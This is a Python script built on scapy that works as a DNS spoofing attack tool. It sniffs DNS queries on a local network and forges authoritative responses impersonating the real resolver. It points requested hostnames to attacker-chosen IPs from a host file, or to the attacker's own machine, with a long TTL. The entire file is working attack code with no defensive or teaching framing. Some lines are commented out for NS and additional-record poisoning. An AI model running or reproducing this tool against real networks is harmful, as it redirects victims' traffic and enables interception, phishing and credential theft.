#!/usr/bin/python

import argparse
import sys
from scapy.all import *
import socket
import time





def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", default = 'eth0', help="interface name")
    parser.add_argument("-f", "--hostnames", dest="hostname", help="Host file name")
    parser.add_argument("--expression", type = str, help = 'bpf filter to be added')
    options = parser.parse_args()
    return options

options = get_arguments()
print(options)
print(str(options.interface) + "  " + str(options.hostname) + "  " + str(options.expression))

hostFileName = ''
hostnames = []
ips = []
bpfFilter = "udp port 53"



interface = str(options.interface)
isThereHostFile = False

if options.hostname is not None:
    isThereHostFile = True
    hostFileName = str(options.hostname)

if (isThereHostFile):
    try:
        f = open(hostFileName, "r")
        for line in f:
            arr = line.split()
            hostnames.append(arr[1])
            ips.append(arr[0])
        
    except Exception as e:
        print("file doesn't exist")
        sys.exit()
else :
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	ips.append(s.getsockname()[0])
	s.close()


if  options.expression is not None:
    bpfFilter = bpfFilter + ' and ' + str(options.expression)


def extractSourceIP(pck):
    print("SOURCE IP : " + pck[IP].src)
    return pck[IP].src

def extractSourcePort(pck):
    if pck.haslayer(UDP):
        print("SOURCE PORT : " + str(pck[UDP].sport))
        return pck[UDP].sport
    else :
        return -1

def extractQueryID(pck):
    print("DNS QUERY ID : " + str(pck[DNS].id))
    return pck[DNS].id

def extractDNSIP(pck):
    print("DNS SERVER IP : " + pck[IP].dst)
    return pck[IP].dst

def extractQueryHostname(pck):
    print("QUERY HOSTNAME : " + pck[DNS].qd.qname)
    return pck[DNS].qd.qname.decode()

def extractQueryCount(pck):
    print("QUERY COUNT : " + str(pck[DNS].qdcount))
    return pck[DNS].qdcount

def extractOPCode(pck):
    print("OPCODE : " + str(pck[DNS].opcode))
    return pck[DNS].opcode

def extractQtype(pck):
    print("QTYPE : " + str(pck[DNS].qd.qtype))
    return pck[DNS].qd.qtype
def extractQd(pck):
    print("QD : " + str(pck[DNS].qd))
    return pck[DNS].qd
def extractQClass(pck):
    print("QCLASS : " + str(pck[DNS].qd.qclass))
    return pck[DNS].qd.qclass

def valuesForNewPacket(pck):
    return extractSourceIP(pck), extractSourcePort(pck), extractDNSIP(pck), extractQueryID(pck), extractQueryHostname(pck), extractQueryCount(pck), extractOPCode(pck), extractQtype(pck), extractQClass(pck), extractQd(pck)

def makePacket(ip_src, port_src,  ip_dns, queryID, queryHost, queryCount, op_code, q_type, q_class, forgedIP, qd1):
    
    ipPacket = IP(src = ip_dns, dst = ip_src)
    udpPacket = UDP(sport=53, dport=port_src)
    dnsPacket = DNS(id = queryID,
                    qd=DNSQR(qname = queryHost, qtype =q_type, qclass=q_class),
                    an=DNSRR(rrname=queryHost, type = 'A', rdata = forgedIP, ttl = 50000),
                    #ns=DNSRR(rrname=queryHost, type='NS', ttl=50000, rdata = forgedIP),
                    #ar=DNSRR(rrname =queryHost, type = 'A', ttl=50000, rdata= forgedIP),
                    qr = 1, 
                    opcode = op_code, 
                    aa=1, 
                    rd=0, 
                    ra=0, 
                    rcode=0, 
                    qdcount = queryCount,
                    ancount=1)
                    #nscount=1,
                    #arcount=1)
    #dnsPacket = DNS(id = queryID, qr=1, aa=1, qd=qd1,an=DNSRR(rrname=queryHost,ttl=10, rdata=forgedIP))
    return ipPacket, udpPacket, dnsPacket


while True:
    
    forgedIP = ''
    pckts = sniff(iface = interface, count = 1, filter = bpfFilter)
    
    start = time.time()
    if (pckts[0].haslayer(DNS)) and (pckts[0].getlayer(DNS).qr == 0) and (pckts[0].getlayer(DNS).qd.qtype == 1) and (pckts[0].getlayer(DNS).qd.qclass== 1 ):
        if isThereHostFile:
            index = 0
            for hn in hostnames:
                if hn in pckts[0][DNS].qd.qname:
                    print("HOSTNAME EXIST IN FILE")
                    forgedIP = ips[index]
                    break
                index = index + 1
            if forgedIP == '':
                print("NOT IN HOSTNAME FILE")
                continue
            ip_src, port_src, ip_dns, queryID, queryHost, queryCount,opcode, qtype, qclass, qd = valuesForNewPacket(pckts[0])
            if port_src == -1:
                print("NOT USING UDP")
                continue
            
            ipPacket, udpPacket, dnsPacket = makePacket(ip_src, port_src,  ip_dns, queryID, queryHost, queryCount, opcode, qtype, qclass, forgedIP, qd)
            print("PACKET MADE.... SEND TO SOURCE")

            packetToBeSent = ipPacket/udpPacket/dnsPacket
            sendp(Ether(src=pckts[0].dst, dst=pckts[0].src)/packetToBeSent, iface=interface, count = 1)
            end = time.time()
            print("TIME TAKEN : " + str((end-start)*1000))
            print("PACKET SENT")

            
        else:
            print("IP : " + ips[0])
            forgedIP = ips[0]
            if forgedIP == '':
                print("NOT IN HOSTNAME FILE")
                continue
            ip_src, port_src, ip_dns, queryID, queryHost, queryCount,opcode, qtype, qclass, qd = valuesForNewPacket(pckts[0])
            if port_src == -1:
                print("NOT USING UDP")
                continue
            
            ipPacket, udpPacket, dnsPacket = makePacket(ip_src, port_src,  ip_dns, queryID, queryHost, queryCount, opcode, qtype, qclass, forgedIP, qd)
            print("PACKET MADE.... SEND TO SOURCE")
            packetToBeSent = ipPacket/udpPacket/dnsPacket
            sendp(Ether(src=pckts[0].dst, dst=pckts[0].src)/packetToBeSent, iface=interface, count = 1)
        
            end = time.time()
            print("TIME TAKEN : " + str((end-start)*1000))
            print("PACKET SENT")






















#while True:
 #   pckts = sniff(iface = interface, count = 1, filter = bpfFilter)
  #  if isThereHostFile:




	


	
	
